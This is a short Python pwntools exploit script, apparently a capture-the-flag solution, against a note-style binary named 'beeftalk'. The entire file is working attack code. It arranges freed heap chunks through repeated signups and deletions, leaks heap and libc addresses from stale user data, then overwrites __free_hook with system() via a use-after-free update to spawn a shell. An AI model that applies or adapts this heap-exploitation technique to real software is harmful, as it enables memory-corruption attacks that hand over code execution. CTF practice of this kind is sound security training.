#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./beeftalk')

def login(token):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Give me your token: \n> ', token)

def signup(name, desc, job, money, correct):
    r.sendlineafter('> ', '2')
    r.sendafter("What's your name ?\n> ", name)
    r.sendafter("What's your desc ?\n> ", desc)
    r.sendafter("What's your job ?\n> ", job)
    r.sendlineafter("How much money do you have ?\n> ", str(money))
    r.sendlineafter("Is correct ?\n(y/n) > ", correct)
    r.recvuntil('Done! This is your login token: ')
    return r.recvline()[:-1]

def leave():
    r.sendlineafter('> ', '3')

# -------- after login --------
def update(name, desc, job, money):
    r.sendlineafter('> ', '1')
    r.sendafter('Name: \n> ', name)
    r.sendafter('Desc: \n> ', desc)
    r.sendafter('Job: \n> ', job)
    r.sendlineafter('Money: \n> ', str(money))

def delete():
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', 'y')

def logout():
    r.sendlineafter('> ', '4')

tokens = [None] * 8
for i in range(8):
    tokens[i] = signup(b'\x00'*0xf8, 'A', 'A', 0xdeadbeef, 'y')

for i in range(2):
    login(tokens[i])
    delete()

login(tokens[1])
r.recvuntil('Hello ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x2a0
info(f"heap: {hex(heap)}")
logout()

for i in range(2, 8):
    login(tokens[i])
    delete()

# make 0x50 chunk in sorted bin to small bin
tokens[0] = signup(b'\x00'*0xf8, 'A', 'A', 0xdeadbeef, 'y') # 0
login(tokens[3])
r.recvuntil('Hello ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebc10
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28
info(f"libc: {hex(libc)}")
logout()

login(tokens[2]) # will be desc of token[0]
update(
    p64(0) + p64(0x51) + p64(0) + p64(__free_hook - 8)[:-1],
    b"/bin/sh\x00" + p64(_system),
    'A', 0xdeadbeef
)
delete()

r.interactive()